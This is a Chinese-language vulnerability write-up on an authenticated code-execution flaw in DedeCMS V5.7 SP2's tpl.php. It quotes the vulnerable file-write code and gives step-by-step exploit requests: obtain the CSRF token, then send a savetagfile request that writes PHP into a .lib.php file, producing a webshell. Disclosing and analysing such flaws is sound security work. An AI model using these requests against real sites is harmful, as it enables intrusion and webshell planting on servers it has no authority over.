# DedeCMS V5.7 SP2后台存在代码执行漏洞

## 影响版本

DedeCMS V5.7 SP2

## 漏洞简介

织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。Dedecms V5.7 SP2版本中的tpl.php中存在代码执行漏洞,可以通过该漏洞在增加新标签中上传木马,获取webshell。该漏洞利用需要登录后台,并且后台的账户权限是管理员权限。


## 漏洞详情

默认后台地址 `/dede/`，文件 `dede/tpl.php` 中的251到281行。


	csrf_check();
		#filename和前面正则的匹配情况
	    if(!preg_match("#^[a-z0-9_-]{1,}\.lib\.php$#i", $filename))
	    {
	        ShowMsg('文件名不合法，不允许进行操作！', '-1');
	        exit();
	    }
	    require_once(DEDEINC.'/oxwindow.class.php');
		#搜索filename中匹配`\.lib\.php$#i`的部分，以空格代替
	    $tagname = preg_replace("#\.lib\.php$#i", "", $filename);
		#去掉反斜号
	    $content = stripslashes($content);
		#拼接文件名
	    $truefile = DEDEINC.'/taglib/'.$filename;
		#写入内容
	    $fp = fopen($truefile, 'w');
	    fwrite($fp, $content);
	    fclose($fp);

replace处理之后赋值给变量 $tagname 。但是写入文件的时候并没有用到$tagname 。
那为什么有这个$tagname，拼接文件名的时候，应该是拼接`tagname`

利用

	1.由于dedecms全局变量注册的特性，所以这里的content变量和filename变量可控。
	
	2.可以看到将content直接写入到文件中导致可以getshell。但是这里的文件名经过正则表达式，所以必须要.lib.php结尾。
	
	3.这里还有一个csrf_check()函数，即请求中必须要带token参数。


#### 漏洞利用

1. 首先获取`token`。访问域名 + `/dede/tpl.php?action=upload`

	http://127.0.0.1/uploads/dede/tpl.php?action=upload

	通过查看页面源码即可获得 token

![token](DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/token.png)

2.然后访问 

	http://127.0.0.1/dede/tpl.php?filename=secnote.lib.php&action=savetagfile&content=<?php phpinfo();?>&token=你的token值



shell 地址

	http://127.0.0.1/include/taglib/secnote.lib.php

![1](DedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.png)


## 参考来源

DedeCMS V5.7 SP2后台存在代码执行漏洞：http://www.freebuf.com/vuls/164035.html

Dede CMS 下载中心：http://www.dedecms.com/products/dedecms/downloads/